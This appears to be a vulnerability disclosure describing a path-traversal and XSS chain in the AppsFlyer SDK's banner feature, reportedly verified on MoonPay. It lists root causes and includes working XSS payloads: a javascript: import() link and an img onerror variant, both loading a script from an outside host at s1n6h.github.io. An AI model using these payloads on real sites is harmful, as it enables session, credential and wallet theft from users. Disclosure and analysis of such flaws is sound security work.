How It Works

  1. Path traversal: af-sb-id has no validation. ../../ traverses to attacker's AppsFlyer workspace.
  2. Auto-render: SDK calls AF('banners','showBanner') on page load → fetches attacker's creative → injects via innerHTML.
  3. XSS fires: Creative layout contains <a href="javascript:import('//s1n6h.github.io/x.js')"> covering full banner area. One tap fires JS on victim origin.
  4. Zero-click variant: If creative uses <img src=x onerror="import(...)"> instead, XSS fires on page load with no interaction. Verified on MoonPay (no CSP enforcement).

Payload: x.js

Hosted at: https://s1n6h.github.io/x.js

Shows: origin, cookies, localStorage, sessionStorage. In a real attack: wallet drain, session theft, credential exfiltration.

Root Causes (AppsFlyer SDK)

  1. No validation on af-sb-id before URL construction
  2. No HTML sanitization in _createElement() — raw innerHTML sink
  3. No filtering of javascript: URIs or onerror/onload handlers
  4. Creative script field injected via createElement('script') — bypasses CSP
